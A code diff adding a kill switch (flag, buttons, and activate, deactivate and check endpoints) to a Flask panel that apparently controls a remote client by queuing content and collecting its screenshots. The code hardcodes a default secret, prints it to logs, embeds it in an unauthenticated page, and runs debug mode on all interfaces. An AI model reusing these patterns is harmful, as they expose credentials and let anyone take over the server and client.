@@ -12,6 +12,7 @@ content_store = []
 screenshot_store = []  # New: Store screenshots
 submission_locked = False
 screenshot_capture_requested = False  # New: Flag for screenshot requests
+kill_switch_activated = False  # New: Kill switch flag
 SECRET_KEY = os.getenv("SECRET_KEY", "my-secret-2025")
 
 FORM_RENDER = '''
@@ -39,7 +40,24 @@ FORM_RENDER = '''
                 </p>
                 <p class="text-sm">Content queue size: <span id="queue-size">{{ queue_size }}</span></p>
                 <p class="text-sm">Screenshots collected: <span id="screenshot-count">{{ screenshot_count }}</span></p>
+                <p class="text-sm">Kill switch: <span id="kill-status" class="{% if kill_switch %}text-red-700 font-bold{% else %}text-green-700{% endif %}">{% if kill_switch %}ACTIVATED{% else %}Inactive{% endif %}</span></p>
             </div>
+        </div>
+
+        <!-- Emergency Controls -->
+        <div class="bg-red-50 border border-red-200 p-6 rounded-lg shadow-lg mb-6">
+            <h2 class="text-xl font-semibold mb-4 text-red-800">Emergency Controls</h2>
+            <div class="flex space-x-4">
+                <button onclick="activateKillSwitch()" class="bg-red-600 text-white py-2 px-4 rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 font-bold">
+                    🛑 KILL SWITCH - Terminate Client
+                </button>
+                <button onclick="deactivateKillSwitch()" class="bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2">
+                    ✅ Deactivate Kill Switch
+                </button>
+            </div>
+            <p class="text-sm text-red-600 mt-2">
+                <strong>Warning:</strong> Kill switch will immediately terminate the client application. Use only in emergencies.
+            </p>
         </div>
 
         <!-- Content Submission Form -->
@@ -141,10 +159,20 @@ FORM_RENDER = '''
                     const statusDiv = document.getElementById('status');
                     const queueSizeSpan = document.getElementById('queue-size');
                     const screenshotCountSpan = document.getElementById('screenshot-count');
+                    const killStatusSpan = document.getElementById('kill-status');
                     const submitButton = document.querySelector('form button');
 
                     queueSizeSpan.textContent = data.queue_size;
                     screenshotCountSpan.textContent = data.screenshot_count || 0;
+                    
+                    // Update kill switch status
+                    if (data.kill_switch) {
+                        killStatusSpan.textContent = 'ACTIVATED';
+                        killStatusSpan.className = 'text-red-700 font-bold';
+                    } else {
+                        killStatusSpan.textContent = 'Inactive';
+                        killStatusSpan.className = 'text-green-700';
+                    }
                     
                     if (data.locked) {
                         statusDiv.classList.remove('bg-green-100');
@@ -163,6 +191,46 @@ FORM_RENDER = '''
                 .catch(error => {
                     console.error('Status update failed:', error);
                 });
+        }
+
+        function activateKillSwitch() {
+            if (confirm('⚠️ WARNING: This will immediately terminate the client application. Are you sure?')) {
+                fetch('/activate_kill_switch', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `key={{ secret_key }}`
+                })
+                .then(response => response.text())
+                .then(data => {
+                    alert('🛑 KILL SWITCH ACTIVATED - Client will terminate');
+                    updateStatus();
+                })
+                .catch(error => {
+                    console.error('Error activating kill switch:', error);
+                    alert('Failed to activate kill switch');
+                });
+            }
+        }
+
+        function deactivateKillSwitch() {
+            fetch('/deactivate_kill_switch', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `key={{ secret_key }}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert('✅ Kill switch deactivated');
+                updateStatus();
+            })
+            .catch(error => {
+                console.error('Error deactivating kill switch:', error);
+                alert('Failed to deactivate kill switch');
+            });
         }
 
         function requestScreenshot() {
@@ -256,6 +324,7 @@ def index():
         locked=submission_locked,
         queue_size=len(content_store),
         screenshot_count=len(screenshot_store),
+        kill_switch=kill_switch_activated,
         secret_key=SECRET_KEY,
         recent_items=content_store[-5:] if content_store else [],
         screenshots=screenshot_store[-10:] if screenshot_store else []  # Show last 10 screenshots
@@ -361,6 +430,48 @@ def interrupt_acknowledge():
     print(f"Interrupt acknowledgment processed. Submissions unlocked. New queue size: {len(content_store)}")
     
     return "Interrupt acknowledgement received. Task removed from queue. New submissions allowed."
+
+# New kill switch endpoints
+@app.route('/activate_kill_switch', methods=['POST'])
+def activate_kill_switch():
+    global kill_switch_activated
+    
+    print("Received kill switch activation request")
+    key = request.form.get('key')
+    
+    if not key or key != SECRET_KEY:
+        print(f"Kill switch activation rejected: Invalid key provided: {key}")
+        return "Invalid key", 403
+    
+    kill_switch_activated = True
+    print("🛑 KILL SWITCH ACTIVATED - Client will be terminated")
+    
+    return "Kill switch activated - client will terminate"
+
+@app.route('/deactivate_kill_switch', methods=['POST'])
+def deactivate_kill_switch():
+    global kill_switch_activated
+    
+    print("Received kill switch deactivation request")
+    key = request.form.get('key')
+    
+    if not key or key != SECRET_KEY:
+        print(f"Kill switch deactivation rejected: Invalid key provided: {key}")
+        return "Invalid key", 403
+    
+    kill_switch_activated = False
+    print("✅ Kill switch deactivated")
+    
+    return "Kill switch deactivated"
+
+@app.route('/check_kill_switch', methods=['GET'])
+def check_kill_switch():
+    key = request.args.get('key')
+    
+    if not key or key != SECRET_KEY:
+        return "Invalid key", 403
+    
+    return jsonify({"kill_switch_active": kill_switch_activated})
 
 # New screenshot-related endpoints
 @app.route('/request_screenshot', methods=['POST'])
@@ -473,6 +584,7 @@ def status():
         "locked": submission_locked,
         "queue_size": len(content_store),
         "screenshot_count": len(screenshot_store),
+        "kill_switch": kill_switch_activated,
         "latest_preview": content_store[-1][:100] + "..." if content_store else "No content"
     }
     print(f"Status response: {status_info}")
@@ -501,4 +613,5 @@ if __name__ == "__main__":
     print(f"Secret key loaded: {'Yes' if SECRET_KEY else 'No'}")
     print(f"Secret key value: {SECRET_KEY}")
     print("Screenshot functionality enabled")
+    print("Kill switch functionality enabled")
     app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
